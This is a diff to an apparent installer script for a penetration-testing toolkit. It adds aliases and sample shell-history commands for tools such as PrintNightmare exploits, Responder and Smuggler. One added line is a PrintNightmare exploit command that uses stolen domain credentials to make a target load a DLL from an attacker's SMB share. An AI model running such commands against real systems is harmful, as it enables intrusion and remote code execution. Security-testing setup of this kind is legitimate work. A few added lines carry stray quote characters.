@@ -610,6 +610,7 @@ echo "pre2k -h" >> ~/.zsh_history
 cd $INTERNALS_DIR
 git clone https://github.com/cube0x0/CVE-2021-1675.git PrintNightmare
 git clone https://github.com/ly4k/PrintNightmare.git PrintNightmare-ly4k
+echo "python3 CVE-2021-1675.py domain.local/user:pass@ip '\\your_ip\smb\your_dll.dll'" >> ~/.zsh_history
 
 # PrivescCheck
 cd $INTERNALS_DIR
@@ -619,11 +620,16 @@ git clone https://github.com/itm4n/PrivescCheck.git
 pipx install git+https://github.com/skelsec/pypykatz || echo "[-] Failed to install Pypycatz"
 
 # PyScan
+cd $INTERNALS_DIR
 git clone https://github.com/afkfr0mkeyb0ard/PyScan.git
+echo "alias pyscan='python3 $INTERNALS_DIR/PyScan/pyscan.py'" >> ~/.zshrc
+echo "pyscan'" >> ~/.zsh_history
 
 # Responder
 cd $INTERNALS_DIR
 git clone https://github.com/lgandx/Responder.git
+echo "alias responder='$INTERNALS_DIR/Responder/Responder.py'" >> ~/.zshrc
+echo "responder -I eth0'" >> ~/.zsh_history
 
 # RottenPotatoNG
 cd $INTERNALS_DIR
@@ -632,6 +638,7 @@ git clone https://github.com/breenmachine/RottenPotatoNG.git
 # RSMangler
 cd $PASSCRACK_DIR
 git clone https://github.com/digininja/RSMangler.git
+echo "alias rsmangler='$PASSCRACK_DIR/RSMangler/rsmangler.rb'" >> ~/.zshrc
 
 # Rtl8812au
 cd $WIFI_DIR
@@ -653,6 +660,8 @@ rm SharpHound-v2.5.13.zip
 # Shortscan
 cd $WEB_DIR
 go install github.com/bitquark/shortscan/cmd/shortscan@latest
+echo "alias shortscan='~/go/bin/shortscan'" >> ~/.zshrc
+echo "shortscan http://example.org/" >> ~/.zsh_history
 
 # Simplify
 cd $MOBILE_DIR
@@ -665,6 +674,7 @@ echo "simplify -v" >> ~/.zsh_history
 # Smuggler
 cd $WEB_DIR
 git clone https://github.com/defparam/smuggler.git
+echo "alias smuggler='python3 $WEB_DIR/smuggler/smuggler.py'" >> ~/.zshrc
 
 # Snoop
 cd $RECON_DIR
@@ -675,9 +685,17 @@ unrar x Snoop_for_GNU_Linux.rar
 rm Snoop_for_GNU_Linux.rar
 
 # Spiderfoot
-# Installed by default on Kali
-# https://github.com/smicallef/spiderfoot
-
+# Installed by default on Kali but remove comments to install
+# cd $RECON_DIR
+# git clone https://github.com/smicallef/spiderfoot.git
+# cd spiderfoot
+# python3 -m venv .
+# source bin/activate
+# pip3 install -r requirements.txt
+# deactivate
+# echo "alias spiderfoot='$RECON_DIR/spiderfoot/bin/python3 $RECON_DIR/spiderfoot/sf.py'" >> ~/.zshrc
+echo "spiderfoot -l 127.0.0.1:5001" >> ~/.zsh_history
+ 
 # Spoofcheck
 cd $RECON_DIR
 git clone https://github.com/a6avind/spoofcheck.git
